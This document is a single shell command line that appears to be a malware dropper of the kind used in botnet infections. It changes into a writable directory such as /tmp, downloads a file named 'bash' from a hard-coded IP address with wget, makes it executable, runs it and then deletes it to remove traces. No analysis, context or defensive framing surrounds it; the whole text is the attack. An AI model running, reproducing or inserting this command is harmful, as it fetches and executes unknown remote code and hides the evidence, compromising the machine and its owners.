cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://173.0.63.133/bash; chmod +x bash; ./bash; rm -rf bash
